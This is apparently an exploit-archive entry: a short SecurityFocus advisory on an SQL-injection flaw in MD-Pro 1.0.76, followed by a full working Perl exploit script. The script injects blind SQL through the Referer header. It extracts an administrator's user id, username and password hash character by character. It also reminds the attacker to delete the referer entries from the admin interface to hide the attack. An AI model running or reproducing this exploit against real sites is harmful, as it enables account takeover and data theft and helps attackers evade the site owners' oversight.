@@ -1,0 +1,318 @@
+source: http://www.securityfocus.com/bid/25864/info
+
+MD-Pro is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+MD-Pro 1.0.76 is vulnerable to this issue; other versions may also be affected. 
+
+#!/usr/bin/perl
+
+use strict;
+use IO::Socket;
+
+my $app = "MDPro 1.0.76";
+my $type = "SQL Injection";
+my $author = "undefined1_";
+my $settings = "magic_quotes_runtime = off, mysql >= 4.1.0";
+
+$| = 1;
+print ":: $app $type - by $author ::\n\n\n";
+
+my $url = shift || usage();
+
+if($url =~ m/^(?:http:\/\/)(.*)/) {
+	$url = $1;
+}
+if($url !~ m/^.*\/$/) {
+	$url .= "/";
+}
+
+get_md5s($url);
+print "don't forget to delete the referers from the admin 
+interface...\n";
+
+sub get_md5s {
+	my $url = shift;
+	$url .= "index.php"; 
+	my $admins_only = shift;
+	my $ps = 0;
+	my $referer = "Firefox ID=". randstring(20,25);
+	
+	my $uid_charset = "1234567890";
+	my $user_charset = 
+"abcdefghijklmnopqrstuvwxyz-_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ][}{+=/\\'\"\@\$#!%^&*()";
+	my $pass_charset = "afc0123456789abde";
+	
+	my $data = "GET " . parse_page($url) . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Referer: $referer\r\n";
+	$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+	$data .= "Connection: close\r\n\r\n";
+	my $recv = sendpacket(parse_host($url), parse_port($url), 
+$data);
+	$ps++;
+	
+	$data = "GET " . parse_page($url) . " HTTP/1.1\r\n";
+	$data .= "Host: " . parse_host($url) . "\r\n";
+	$data .= "Referer: '\r\n";
+	$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+	$data .= "Connection: close\r\n\r\n";
+	$recv = sendpacket(parse_host($url), parse_port($url), $data);
+	$ps++;
+	if($recv !~ m/Call to undefined function PN_DBMsgError/m) {
+		print "magic quotes = on ;-[\n";
+		return $ps;
+	}
+	
+	my $recv;
+	my $lastuid = 0;
+	while(1) {
+		my $uid_length = length("$lastuid");
+		my $user_length = 1;
+		my $pass_length = 32;
+		my $uid = "";
+		my $user = "";
+		my $pass = "";
+		my $O_RLY = 0;
+
+		for(my $x = $uid_length; $x <= 8; $x++) {
+			print "\ruid length = $uid_length";
+			$data = "GET " . parse_page($url) . " 
+HTTP/1.1\r\n";
+			$data .= "Host: " . parse_host($url) . "\r\n";
+			$data .= "Referer: $referer' and (select 1 from 
+md_group_membership where length(CONCAT(pn_uid))=$x and pn_uid>$lastuid 
+and pn_gid=2 limit 1 order by pn_uid asc)=1 order by 1 asc/*\r\n";
+			$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+			$data .= "Connection: close\r\n\r\n";
+			$recv = sendpacket(parse_host($url), 
+parse_port($url), $data);
+			$ps++;
+
+			if($recv =~ m/Call to undefined function 
+PN_DBMsgError/m) {
+				$uid_length = $x;
+				$x = 9;
+				$O_RLY = 1;
+			}
+		}
+		
+		if($O_RLY == 0) { return $ps; }
+		$O_RLY = 0;
+		
+		print "\ruid length = $uid_length\n";
+		
+		for(my $i = 1; $i <= $uid_length; $i++) {
+			for(my $j = 0; $j < length($uid_charset); $j++) 
+{
+				my $key = substr($uid_charset, $j, 1);
+				my $hex_key = sprintf("0x%02x", 
+ord($key));
+				print "\ruid = $uid$key";
+				
+				$data = "GET " . parse_page($url) . " 
+HTTP/1.1\r\n";
+				$data .= "Host: " . parse_host($url) . 
+"\r\n";
+				$data .= "Referer: $referer' and (select 
+1 from md_group_membership where substring(pn_uid,$i,1)=$hex_key and 
+pn_uid>$lastuid and pn_gid=2 order by pn_uid asc limit 1)=1 order by 1 
+asc/*\r\n";
+				$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+				$data .= "Connection: close\r\n\r\n";
+				$recv = sendpacket(parse_host($url), 
+parse_port($url), $data);
+				$ps++;				
+				
+				if($recv =~ m/Call to undefined function 
+PN_DBMsgError/m) {
+					$uid .= $key;
+					$j = length($uid_charset);				
+				}				
+			}	
+		}
+		
+		print "\ruid = $uid\n";
+			
+		for(my $x = $user_length; $x <= 25; $x++) {
+			print "\ruser length = $x";
+			$data = "GET " . parse_page($url) . " 
+HTTP/1.1\r\n";
+			$data .= "Host: " . parse_host($url) . "\r\n";
+			$data .= "Referer: $referer' and (select 1 from 
+md_users where length(pn_uname)=$x and pn_uid=$uid limit 1)=1 order by 1 
+asc/*\r\n";
+			$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+			$data .= "Connection: close\r\n\r\n";
+			$recv = sendpacket(parse_host($url), 
+parse_port($url), $data);
+			$ps++;
+
+			if($recv =~ m/Call to undefined function 
+PN_DBMsgError/m) {
+				$user_length = $x;
+				$x = 26;
+				$O_RLY = 1;
+			}
+		}
+		
+		if($O_RLY == 0) { return $ps; }
+		$O_RLY = 0;
+		
+		print "\ruser length = $user_length\n";
+		
+		for(my $i = 1; $i <= $user_length; $i++) {
+			for(my $j = 0; $j < length($user_charset); $j++) 
+{
+				my $key = substr($user_charset, $j, 1);
+				my $hex_key = sprintf("0x%02x", 
+ord($key));
+				print "\ruser = $user$key";
+				
+				$data = "GET " . parse_page($url) . " 
+HTTP/1.1\r\n";
+				$data .= "Host: " . parse_host($url) . 
+"\r\n";
+				$data .= "Referer: $referer' and (select 
+1 from md_users where substring(pn_uname,$i,1)=$hex_key and pn_uid=$uid 
+limit 1)=1 order by 1 asc/*\r\n";
+				$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+				$data .= "Connection: close\r\n\r\n";
+				$recv = sendpacket(parse_host($url), 
+parse_port($url), $data);
+				$ps++;				
+				
+				if($recv =~ m/Call to undefined function 
+PN_DBMsgError/m) {
+					$user .= $key;
+					$j = length($user_charset);				
+				}				
+			}	
+		}
+				
+		print "\ruser = $user\n";
+		
+		
+		
+		
+		# pour le pass, faire genre un tolower du char direct 
+dans la sql query
+		
+		for(my $i = 1; $i <= $pass_length; $i++) {
+			for(my $j = 0; $j < length($pass_charset); $j++) 
+{
+				my $key = substr($pass_charset, $j, 1);
+				my $hex_key = sprintf("0x%02x", 
+ord($key));
+				print "\rpassword = $pass$key";
+				
+				$data = "GET " . parse_page($url) . " 
+HTTP/1.1\r\n";
+				$data .= "Host: " . parse_host($url) . 
+"\r\n";
+				$data .= "Referer: $referer' and (select 
+1 from md_users where lower(substring(pn_pass,$i,1))=$hex_key and 
+pn_uid=$uid limit 1)=1 order by 1 asc/*\r\n";
+				$data .= "Accept: 
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+				$data .= "Connection: close\r\n\r\n";
+				$recv = sendpacket(parse_host($url), 
+parse_port($url), $data);
+				$ps++;				
+				
+				if($recv =~ m/Call to undefined function 
+PN_DBMsgError/m) {
+					$pass .= $key;
+					$j = length($pass_charset);				
+				}				
+			}	
+		}
+				
+		print "\rpassword = $pass\n\n";
+		
+		
+		exit;
+	}
+}
+
+# ======================================================
+
+sub parse_host {
+	my $url = shift;
+	if($url =~ m/^([^\/:]+).*\//) {
+		return $1;
+	}
+	return "127.0.0.1";
+}
+
+sub parse_port {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
+		return $1;
+	}
+	return "80";
+}
+
+sub parse_page {
+	my $url = shift;
+	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
+		return $1;
+	}
+	return "/";
+}
+
+sub randstring(\$,\$) {
+	my $min = shift;
+	my $max = shift;
+
+	my $length = int( (rand(65535)%($max-$min+1))+$min);
+	my $ret = "";
+	for(my $i = 0; $i < $length; $i++)
+	{
+		my $w = int(rand(3));
+		if($w == 0)
+		{
+			$ret .= chr(97 + int(rand(26)));
+		}
+		elsif($w == 1)
+		{
+			$ret .= chr(65 + int(rand(26)));
+		}
+		else
+		{
+			$ret .= chr(48 + int(rand(10)));
+		}
+	}
+
+	return $ret;
+}
+
+sub sendpacket {
+	my $server = shift;
+	my $port = shift;
+	my $data = shift;
+
+	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => 
+$server, PeerPort => $port) or die ":: Could not connect to $server:80 
+$!\n";
+	print $sock "$data";
+	
+	$data = "";
+	my $resp;
+	while($resp = <$sock>)	{ $data .= $resp; }
+	
+	close($sock);
+	return $data;
+}
+
+sub usage() {
+	printf "usage: %s <url>\n", $0;	
+	exit;
+}
